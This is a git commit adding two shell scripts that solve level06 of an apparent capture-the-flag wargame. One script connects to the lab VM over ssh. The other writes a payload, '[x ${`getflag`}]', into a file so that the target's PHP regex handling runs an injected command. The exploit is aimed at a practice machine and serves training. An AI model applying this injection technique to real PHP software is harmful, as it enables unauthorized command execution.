dc1f625fb9b839eeade749ed557ba725b87ae469
ADV <a.deverdilhac@gmail.com>
2020-09-25 13:02:05 +0200

    [ade-verd] add prev_token, set -x

---
+++ level06/Ressources_adv/main.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+LEVEL="06"
+
+CURDIR=`dirname "$(readlink -f "$0")"`
+
+PREV_LEVEL=`printf "%02d" $(($LEVEL-1))`
+PW=`cat $CURDIR/../../level$PREV_LEVEL/flag`
+
+SNOW_USER="level$LEVEL"
+
+if [ -z ${SNOW_HOST+x} ]; then read -p "VM Host: " SNOW_HOST; fi
+if [ -z ${SNOW_PORT+x} ]; then read -p "VM Port: " SNOW_PORT; fi
+
+FLAG_CONTENT=`cat $CURDIR/../flag`
+
+# Connect to 'level06'
+echo -e "\n$SNOW_USER password is : $PW\n"
+ssh -p $SNOW_PORT $SNOW_USER@$SNOW_HOST 'bash' < $CURDIR/script.sh
+echo -e "\nExpected flag: $FLAG_CONTENT"
---
+++ level06/Ressources_adv/script.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+set -x
+
+# 1. Create the getflag file containing the string for regex
+echo '[x ${`getflag`}]' > /tmp/flag06
+
+# 2. Execute the PHP script, so it executes our injected getflag
+./level06 /tmp/flag06
